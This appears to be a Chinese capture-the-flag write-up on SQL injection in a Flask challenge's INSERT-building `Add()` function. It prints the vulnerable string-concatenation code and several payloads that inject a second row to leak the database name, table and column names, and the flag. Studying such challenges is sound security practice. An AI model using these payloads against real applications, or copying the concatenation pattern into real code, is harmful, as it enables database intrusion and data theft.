ailx10说：这篇是我2025年2月写的。这道 Flask SQL 题给了源码，我顺着留言的 Add 方法往下看，发现 values 是直接拼成 INSERT 的，于是尝试把第二条留言也带进去，让库名、表名和字段值按显示逻辑回到页面。过程里 NULL、带引号的字符串、用户 id 和日期字段都得分别试，少看一个约束就会卡住。这篇留下的是一层层查、再一层层验证的过程。它也很适合提醒自己：看见 SQL 注入四个字并不代表可以跳过语句结构，插入题和常见查询题的回显位置就很不一样。

---

原题的 Add 函数把输入拼进 INSERT 语句；应以参数化查询与输入类型校验替代字符串拼接。

![](/notes-assets/9a9fb0d3ee5f31d97b2d.webp)

注册账号，可以在 `/index` 下提交留言

![](/notes-assets/64b9bce1e0e44f7c0dd3.webp)

给了源代码，代码审计：`others.py` 中的 `Add()` 方法存在SQL注入

```
def Add(self, tablename, values):

        sql = "insert into " + tablename + " "

        sql += "values ("

        sql += "".join(i + "," for i in values)[:-1]

        sql += ")"

        try:

            self.db_session.execute(sql)

            self.db_session.commit()

            return 1

        except:

            return 0
```

![](/notes-assets/2f9a7c7e6756cd81045c.webp)

传参如下：输入点在 `/index` 页面

```
res = mysql.Add("post", ['NULL', 

                         "'%s'" % form.post.data,

                         "'%s'" % current_user.id, 

                         "'%s'" % now()])
```

![](/notes-assets/85bbe34b812f5fb87242.webp)

构造请求：

```
ailx10','1','2025-2-5'),(Null,(select database()),'1','2025-2-5')#
```

原作者将输入解释为两行 INSERT。原文展示的生成语句包含引号转写疑点；NULL 与字符串 'NULL' 不同，实际行为还取决于列类型、约束和账号关联。

```
res = mysql.Add("post", ['NULL', 

                         'ailx10','1','2025-2-5'),('NULL',(select database()),'1','2025-2-5')#

                         "'%s'" % current_user.id, 

                         "'%s'" % now()])
```

![](/notes-assets/2c37287d3d304903a330.webp)

那么接下来就很简单了，查询表，得到所有的表名：flag,followers,post,user

```
ailx10','1','2025-2-5'),(Null,(select group_concat(table_name) from information_schema.tables where table_schema='flask'),'1','2025-2-5')#
```

![](/notes-assets/f3c7c6435fdbb495bd67.webp)

查询flag表中的字段，得到字段名也是flag

```
ailx10','1','2025-2-5'),(Null,(select group_concat(column_name) from information_schema.columns where table_name='flag'),'1','2025-2-5')#
```

![](/notes-assets/b92ca08c4fc78f606c3d.webp)

最后，直接查询字段值

```
ailx10','1','2025-2-5'),(Null,(select flag from flag),'1','2025-2-5')#
```

![](/notes-assets/890ce6ceaa77ae929f9c.webp)

这次不是在原留言里硬挤出输出，而是利用插入语句本身的结构。看懂它怎样多出一条记录，再回头看拼接位置，漏洞原因会比最终字符串更容易记住。
